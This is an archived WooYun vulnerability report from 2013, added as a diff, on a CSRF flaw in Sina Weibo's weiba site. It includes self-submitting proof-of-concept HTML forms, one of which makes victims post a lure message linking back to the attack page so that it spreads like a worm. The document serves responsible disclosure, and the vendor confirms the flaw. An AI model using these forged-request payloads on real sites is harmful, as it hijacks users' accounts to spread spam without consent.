@@ -1,0 +1,250 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪微博首页再来一波蠕虫  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪微博首页再来一波蠕虫  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/风萧萧">风萧萧</a> 
+</li><li>提交时间：		2013-01-22 20:42</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-02-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-11：	细节向普通白帽子公开<br/>
+									2013-02-21：	细节向实习白帽子公开<br/>
+									2013-03-08：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">金龙大锅，我又来了</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1.出问题的是这个地方撒！</p><pre><code>http://weiba.weibo.com</code></pre><p class='detail'></p><p class="detail"><a href="../images/222012463c9bce800ab6ab65c061f3cf64500f6b.jpg" target="_blank"><img src="../images/222012463c9bce800ab6ab65c061f3cf64500f6b.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+2.这个站点几乎没有对CSRF做任何防范，不过加关注刷粉丝的地方除外啊！举两个例子如下：<br />
+<br />
+<br />
+<br />
+3.首先是支持微博吧的地方，对于微博吧的支持没有防范CSRF，导致可以刷微博吧粉丝，不是刷个人粉丝的地方撒：</p><p class="detail"><a href="../images/22201610051fadf285ced2cd346e0947ad3fd650.jpg" target="_blank"><img src="../images/22201610051fadf285ced2cd346e0947ad3fd650.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+构造POC如下：</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;fxx&quot; name=&quot;fxx&quot; action=&quot;http://weiba.weibo.com/aj_baropen/support&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;abid&quot; value=&quot;23093&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+	document.fxx.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">4.点击上图【支持一下】后，会有如下转发到微博的请求发出！</p><p class="detail"><a href="../images/222018114d62377b6e7b5fcb30927684c2902d1f.jpg" target="_blank"><img src="../images/222018114d62377b6e7b5fcb30927684c2902d1f.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+5.点击【发布】，抓包查看请求如下：</p><pre><code>http://weiba.weibo.com/aj_baropen/share?__rnd=1358845029390<br />
+<br />
+POST /aj_baropen/share?__rnd=1358845029390 HTTP/1.1<br />
+Host: weiba.weibo.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 555<br />
+Origin: http://weiba.weibo.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Accept: */*<br />
+Referer: http://weiba.weibo.com/bar/open/27872?from=repba<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
+Cookie: 略<br />
+<br />
+text=#开通微吧#我刚刚投给了 “耽美吧” 1票，支持量达到3000 “耽美吧” 就能开通了，亲！给力支持一下吧~点此投票：http://weiba.weibo.com/bar/open/27872?from=repba&amp;from=0&amp;pid=a753ecd1jw1dzxuipd4hrj&amp;_t=0</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+6.POST请求的几个参数都好理解，text参数是转发到微博的内容，from参数表示是来自哪里，但是pid参数不能确认，不知道是token还是什么一个指定的id，不过我去掉了是没有关系的。<br />
+<br />
+<br />
+<br />
+7.构造如下POC页面：</p><pre><code>&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;<br />
+&lt;/head&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;fxx&quot; name=&quot;fxx&quot; action=&quot;http://weiba.weibo.com/aj_baropen/share&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;text&quot; id=&quot;content&quot; value=&quot;test&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;from&quot; value=&quot;0&quot; /&gt;<br />
+&lt;input type=&quot;text&quot; name=&quot;pid&quot; value=&quot;a753ecd1jw1dzxuipd4hrj&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+	var random=new Array();<br />
+	random[0]=&quot;&quot;;<br />
+	random[1]=&quot;有帅哥哦&quot;;<br />
+	random[2]=&quot;有萝莉哦&quot;;<br />
+	random[3]=&quot;有小清新哦&quot;;<br />
+	random[4]=&quot;有女王哦&quot;;<br />
+	random[5]=&quot;有御姐哦&quot;;<br />
+	random[6]=&quot;有高帅富哦&quot;;<br />
+	random[7]=&quot;有女屌丝哦&quot;;<br />
+	random[8]=&quot;有美女哦&quot;;<br />
+	random[9]=&quot;有苍老师哦&quot;;<br />
+	var num =parseInt(Math.random()*10);<br />
+	var constr=&quot;   follow me! http://xssed.me/csrf/weibo.html&quot;;<br />
+	var sendstr=random[num]+constr;<br />
+	alert(sendstr);<br />
+	document.getElementById(&quot;content&quot;).setAttribute(&quot;value&quot;,sendstr);<br />
+	document.fxx.submit();<br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+8.本地chrome浏览器运行，查看返回结果以及微博首页转发情况：</p><p class="detail"><a href="../images/22202231c24a89aed5f88fa58d1c7ba2a3a8d098.jpg" target="_blank"><img src="../images/22202231c24a89aed5f88fa58d1c7ba2a3a8d098.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/222022400e7d87e6a6e424a285dfb17aa71d7f74.jpg" target="_blank"><img src="../images/222022400e7d87e6a6e424a285dfb17aa71d7f74.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+9.IE浏览器登录另一个微博账号，查找到刚才发表的微博，点击链接，同样也发表了一篇微博：</p><p class="detail"><a href="../images/22202322c1b49f9c49ba64b76f5daf485bc91ac7.jpg" target="_blank"><img src="../images/22202322c1b49f9c49ba64b76f5daf485bc91ac7.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">金龙大锅要言而有信哦！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/风萧萧" title="风萧萧">风萧萧</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017694" title="新浪微博首页再来一波蠕虫">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：13 </p>
+													<p class="detail">确认时间：2013-01-22 23:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注新浪安全。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17694";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
